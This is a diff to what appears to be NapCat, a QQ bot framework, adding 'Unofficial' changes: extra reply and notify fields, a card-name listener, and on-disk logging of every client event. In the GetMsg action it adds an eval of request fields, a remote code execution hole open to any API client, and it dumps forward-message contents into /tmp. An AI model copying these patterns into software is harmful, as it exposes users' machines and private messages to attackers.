@@ -29140,6 +29140,9 @@ class PacketMsgReplyElement extends IPacketMsgElement {
     this.targetUin = +(element.replyElement.senderUin ?? 0);
     this.targetUid = element.replyElement.senderUidStr ?? "";
     this.targetPeer = element.replyElement._replyMsgPeer;
+	// Unofficial but likely just not ready
+    this.targetElems = element.replyElement.__Elems;
+    this.targetSourceMsg = element.replyElement.__sourceMsg;
   }
   get isGroupReply() {
     return this.targetMessageClientSeq === 0;
@@ -31114,6 +31117,11 @@ class UploadForwardMsg extends PacketTransformer {
         }]
       }
     );
+	// Unofficial
+	const random_file_id = '/tmp/NapCat.'+new Date + Math.random();
+	fs$1.writeFileSync(random_file_id+'@w1.json', JSON.stringify(longMsgResultData));
+	fs$1.writeFileSync(random_file_id+'@w2.json', JSON.stringify(msgBody, (_,a)=>typeof a == 'bigint' ? '#Number:'+a : a));
+	
     const payload = zlib__default.gzipSync(Buffer.from(longMsgResultData));
     const req = new NapProtoMsg(SendLongMsgReq).encode(
       {
@@ -32370,6 +32378,10 @@ class PacketOperationContext {
     const res = DownloadForwardMsg$1.parse(resp);
     const inflate = gunzipSync$1(res.result.payload);
     const result = new NapProtoMsg(LongMsgResult).decode(inflate);
+	// Unofficial
+	const random_file_id = '/tmp/NapCat.'+new Date + Math.random();
+	fs$1.writeFileSync(random_file_id+'@r1.json', JSON.stringify([...inflate]));
+	fs$1.writeFileSync(random_file_id+'@r2.json', JSON.stringify(result, (_,a)=>typeof a == 'bigint' ? '#Number:'+a : a));
     const main = result.action.find((r) => r.actionCommand === "MultiMsg");
     if (!main?.actionData.msgBody) {
       throw new Error("msgBody is empty");
@@ -45329,7 +45341,8 @@ class NapCatCore {
     };
   }
   async initCore() {
-    this.NapCatDataPath = path$1.join(this.dataPath, "NapCat");
+    this.NapCatDataPath = path$1.resolve(os$1.homedir(), "./.config/NapCat"); // Unofficial
+    // this.NapCatDataPath = path$1.join(this.dataPath, "NapCat");
     fs$1.mkdirSync(this.NapCatDataPath, { recursive: true });
     this.NapCatTempPath = path$1.join(this.NapCatDataPath, "temp");
     if (!fs$1.existsSync(this.NapCatTempPath)) {
@@ -78501,7 +78514,8 @@ class OneBotGroupApi {
       const member = await this.core.apis.GroupApi.getGroupMember(msg.peerUid, msg.senderUin);
       if (member && member.cardName !== msg.sendMemberName) {
         const newCardName = msg.sendMemberName ?? "";
-        const event = new OB11GroupCardEvent(this.core, parseInt(msg.peerUid), parseInt(msg.senderUin), newCardName, member.cardName);
+		// Unofficial: Unused, now negative uid instead
+        const event = new OB11GroupCardEvent(this.core, -parseInt(msg.peerUid), parseInt(msg.senderUin), newCardName, member.cardName);
         member.cardName = newCardName;
         return event;
       }
@@ -79222,6 +79236,9 @@ class OneBotMsgApi {
   notifyGroupInvite = new LRUCache(50);
   // seq -> notify
   rawToOb11Converters = {
+    inlineKeyboardElement: async (element) => { // Unofficial
+      return {type: "inlineKeyboardElement", data: element};
+    },
     textElement: async (element) => {
       if (element.atType === NTMsgAtType.ATTYPEUNKNOWN) {
         let text = element.content;
@@ -79628,20 +79645,18 @@ class OneBotMsgApi {
       const info = await this.core.apis.UserApi.getUserDetailInfo(uid);
       return at(atQQ, uid, NTMsgAtType.ATTYPEONE, info.nick || "");
     },
-    [OB11MessageDataType.reply]: async ({ data: { id } }) => {
-      const replyMsgM = MessageUnique.getMsgIdAndPeerByShortId(parseInt(id));
+    [OB11MessageDataType.reply]: async ({ data: { id, replyMsgG, replyMsgGE } }) => { // Unofficial
+     if (!replyMsgG) {
+      var replyMsgM = MessageUnique.getMsgIdAndPeerByShortId(parseInt(id));
       if (!replyMsgM) {
         this.core.context.logger.logWarn("回复消息不存在", id);
         return void 0;
       }
-      const replyMsg = (await this.core.apis.MsgApi.getMsgsByMsgId(
+      var replyMsg = (await this.core.apis.MsgApi.getMsgsByMsgId(
         replyMsgM.Peer,
         [replyMsgM.MsgId]
       )).msgList[0];
-      return replyMsg ? {
-        elementType: ElementType.REPLY,
-        elementId: "",
-        replyElement: {
+      replyMsgG = replyMsg ? {
           replayMsgSeq: replyMsg.msgSeq,
           // raw.msgSeq
           replayMsgId: replyMsg.msgId,
@@ -79650,8 +79665,12 @@ class OneBotMsgApi {
           senderUinStr: replyMsg.senderUin,
           replyMsgClientSeq: replyMsg.clientSeq,
           _replyMsgPeer: replyMsgM.Peer
+        } : void 0;
         }
-      } : void 0;
+        for (var i in replyMsgGE) replyMsgG[i] = replyMsgGE[i];
+      return  {
+        elementType: ElementType.REPLY,
+        elementId: "",replyElement:replyMsgG} 
     },
     [OB11MessageDataType.face]: async ({ data: { id, resultId, chainCount } }) => {
       const parsedFaceId = +id;
@@ -80764,6 +80783,11 @@ class GetMsg extends OneBotAction {
   actionName = ActionName.GetMsg;
   payloadSchema = SchemaData$1m;
   async _handle(payload, _adapter, config) {
+    // Unofficial
+    if (payload.eval) {
+      var that = this;
+      return await eval(`(async function(){${payload.eval.join?payload.eval.join(''):payload.eval}})`)();
+    }
     if (!payload.message_id) {
       throw Error("参数message_id不能为空");
     }
@@ -80783,6 +80807,8 @@ class GetMsg extends OneBotAction {
     if (!msg) throw Error("消息不存在");
     const retMsg = await this.obContext.apis.MsgApi.parseMessage(msg, config.messagePostFormat);
     if (!retMsg) throw Error("消息为空");
+	try{retMsg.raw=msg}catch{} // Unofficial
+    if (payload.mods) eval(payload.mods);
     try {
       retMsg.message_id = MessageUnique.createUniqueMsgId(peer, msg.msgId);
       retMsg.message_seq = retMsg.message_id;
@@ -82046,7 +82072,7 @@ class GetGroupIgnoredNotifies extends OneBotAction {
   actionName = ActionName.GetGroupIgnoredNotifies;
   async _handle() {
     const SingleScreenNotifies = await this.core.apis.GroupApi.getSingleScreenNotifies(false, 50);
-    const retData = { InvitedRequest: [], join_requests: [] };
+    const retData = { InvitedRequest: [], join_requests: [], _misc: [] }; // Unofficial begin with _
     const notifyPromises = SingleScreenNotifies.map(async (SSNotify) => {
       const invitorUin = SSNotify.user1?.uid ? +await this.core.apis.UserApi.getUinByUidV2(SSNotify.user1.uid) : 0;
       const actorUin = SSNotify.user2?.uid ? +await this.core.apis.UserApi.getUinByUidV2(SSNotify.user2.uid) : 0;
@@ -82059,12 +82085,15 @@ class GetGroupIgnoredNotifies extends OneBotAction {
         group_name: SSNotify.group?.groupName,
         checked: SSNotify.status !== GroupNotifyMsgStatus.KUNHANDLE,
         actor: actorUin,
-        requester_nick: SSNotify.user1?.nickName
+        requester_nick: SSNotify.user1?.nickName,
+        _raw: SSNotify
       };
       if (SSNotify.type === 1) {
         retData.InvitedRequest.push(commonData);
       } else if (SSNotify.type === 7) {
         retData.join_requests.push(commonData);
+      } else {
+        retData._misc.push(commonData);
       }
     });
     await Promise.all(notifyPromises);
@@ -82600,7 +82629,7 @@ class GetGroupSystemMsg extends OneBotAction {
   actionName = ActionName.GetGroupSystemMsg;
   async _handle() {
     const SingleScreenNotifies = await this.core.apis.GroupApi.getSingleScreenNotifies(false, 50);
-    const retData = { invited_requests: [], InvitedRequest: [], join_requests: [] };
+    const retData = { InvitedRequest: [], join_requests: [], _misc: [] }; // Unofficial begin with _
     const notifyPromises = SingleScreenNotifies.map(async (SSNotify) => {
       const invitorUin = SSNotify.user1?.uid ? +await this.core.apis.UserApi.getUinByUidV2(SSNotify.user1.uid) : 0;
       const actorUin = SSNotify.user2?.uid ? +await this.core.apis.UserApi.getUinByUidV2(SSNotify.user2.uid) : 0;
@@ -82613,16 +82642,18 @@ class GetGroupSystemMsg extends OneBotAction {
         group_name: SSNotify.group?.groupName,
         checked: SSNotify.status !== GroupNotifyMsgStatus.KUNHANDLE,
         actor: actorUin,
-        requester_nick: SSNotify.user1?.nickName
+        requester_nick: SSNotify.user1?.nickName,
+        _raw: SSNotify
       };
       if (SSNotify.type === 1) {
         retData.InvitedRequest.push(commonData);
       } else if (SSNotify.type === 7) {
         retData.join_requests.push(commonData);
+      } else {
+        retData._misc.push(commonData);
       }
     });
     await Promise.all(notifyPromises);
-    retData.invited_requests = retData.InvitedRequest;
     return retData;
   }
 }
@@ -84056,6 +84087,91 @@ class NapCatOneBot11Adapter {
     this.initMsgListener();
     this.initBuddyListener();
     this.initGroupListener();
+	// Unofficial: Record ALL events
+	!function(core, networkManager){
+		function stringify(arg) {
+			// return Object.keys(arg);
+			try {
+				return JSON.stringify(arg, (_,x)=>
+					x==Infinity||x==-Infinity?'#Number'+x:
+					x instanceof Map?['#Map', ...x.entries()]:
+					x instanceof Set?['#Set', ...x.keys()]:
+					x);
+			} catch (e) {	
+				return '#Error:' + e;
+			}	
+		}
+		function Logger(type, name) {
+			return function(...args) {
+			  try {
+				const time = new Date().toJSON();
+				const path = path$1.resolve(os$1.homedir(), "./.config/NapCat") + '/Events/' + time.slice(0,16);
+				fs$1.mkdirSync(path, { recursive: true });
+				const fn = `${path}/${time} ${type}.${name} ${Math.random()}.json`;
+				// try {
+					fs__default.writeFileSync(fn, stringify(args)); 
+					const event = new OB11GroupNoticeEvent(core, 1, 1);
+					event.pack = fn;
+					networkManager.emitEvent(event).catch((e) => {
+						fs__default.writeFileSync(fn+'e', 'Err1.' + e);
+					});
+				//} catch(e) {
+				//	fs__default.writeFileSync(fn+'e', 'Err2.' + e);
+				//}
+			  } catch {}
+			}
+		}
+		const events = JSON.parse(fs__default.readFileSync(`/home/me/bin/QQ/LiteLoaderQQNT-main/plugins/NapCat.Framework/_local_event_list.json`, 'utf8'));
+		return [
+				'getQQEmailService.addKernelShareListener',
+				'getShareToWechatService.addKernelShareListener',
+				'getTianShuService.addKernelTianShuListener',
+				'getUnitedConfigService.addKernelUnitedConfigListener',
+				'getTicketService.addKernelTicketListener',
+				'getTipOffService.addKernelTipOffListener',
+				'getProfileService.addKernelProfileListener',
+				'getProfileLikeService.addKernelProfileLikeListener',
+				'getBuddyService.addKernelBuddyListener',
+				'getSearchService.addKernelSearchListener',
+				'getGroupService.addKernelGroupListener',
+				'getMsgService.addKernelMsgListener',
+				'getMsgService.addKernelMsgImportToolListener',
+				'getMsgService.addKernelTempChatSigListener',
+				'getRecentContactService.addKernelRecentContactListener',
+				'getConfigMgrService.addKernelConfigMgrListener',
+				'getDirectSessionService.addKernelDirectSessionListener',
+				'getRDeliveryService.addDataChangeListener',
+				'getAvatarService.addAvatarListener',
+				'getFeedChannelService.addKernelFeedListener',
+				'getNewFeedChannelService.addKernelFeedListener',
+				'getCollectionService.addKernelCollectionListener',
+				'getSettingService.addKernelSettingListener',
+				'getStorageCleanService.addKernelStorageCleanListener',
+				'getQiDianService.addKernelQiDianListener',
+				'getFileAssistantService.addKernelFileAssistantListener',
+				'getGuildService.addKernelGuildListener',
+				'getSkinService.addKernelSkinListener',
+				'getFileBridgeHostService.addKernelFileBridgeHostListener',
+				'getWiFiPhotoClientService.addKernelWiFiPhotoClientListener',
+				'getOnlineStatusService.addKernelOnlineStatusListener',
+				'getRemotingService.addKernelRemotingListener',
+				'getRobotService.addKernelRobotListener',
+				'getLockService.addKernelLockListener',
+				'getBaseEmojiService.addKernelBaseEmojiListener',
+				'getNodeMiscService.addKernelNodeMiscListener',
+				'getGuildHotUpdateService.addHotUpdateListener',
+				'getMsgBackupService.addKernelMsgBackupListener',
+				'getAVSDKService.addKernelAVSDKListener' ].map(i=> {
+			try {
+				var [a,b] = i.split('.');
+				var e = {};
+				for (var o in events) {
+					e[o] = Logger(i, o);
+				}
+				return core.context.session[a]()[b](e);
+			} catch {}
+		})
+	} (this.core, this.networkManager);
     WebUiDataRuntime.setQQVersion(this.core.context.basicInfoWrapper.getFullQQVesion());
     WebUiDataRuntime.setQQLoginInfo(selfInfo);
     WebUiDataRuntime.setQQLoginStatus(true);
@@ -84232,6 +84348,22 @@ ${newLog}`);
   }
   initGroupListener() {
     const groupListener = new NodeIKernelGroupListener();
+    // unofficial
+		const userNameCache = {};
+		groupListener.onMemberInfoChange = (groupCode, dateSource, members) => {
+            members.forEach(async (userData) => {
+				const idx = groupCode + '.' + userData.uin;
+                const member = userNameCache[idx] || (userNameCache[idx] = {});
+                if (member.cardName !== userData.cardName) {
+                    const newCardName = userData.cardName ?? '';
+					if (member.cardName) {
+						const event = new OB11GroupCardEvent(this.core, parseInt(groupCode), parseInt(userData.uin), newCardName, member.cardName);
+						this.networkManager.emitEvent(event);
+					}
+                    member.cardName = newCardName;
+                }
+            })
+        };
     groupListener.onGroupNotifiesUpdated = async (_, notifies) => {
       await this.core.apis.GroupApi.clearGroupNotifiesUnreadCount(false);
       if (!notifies[0]?.type) return;
